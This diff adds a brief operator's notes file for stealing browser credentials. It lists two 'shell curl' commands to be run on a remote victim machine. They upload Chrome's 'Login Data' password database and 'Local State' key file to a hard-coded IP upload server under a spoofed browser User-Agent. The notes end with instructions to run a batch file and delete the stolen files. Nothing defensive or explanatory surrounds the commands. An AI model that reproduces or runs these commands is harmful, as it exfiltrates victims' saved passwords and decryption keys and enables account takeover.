@@ -1,0 +1,13 @@
+run the server: run_server.bat
+
+script to run on remote:
+
+1.
+shell curl -X POST http://96.9.125.224:9005/upload -H "User-Agent: Mozilla/5.0" -F "files=@%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
+
+2.
+shell curl -X POST http://96.9.125.224:9005/upload -H "User-Agent: Mozilla/5.0" -F "files=@%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
+
+run: run.bat
+
+delete Login Data and Local State
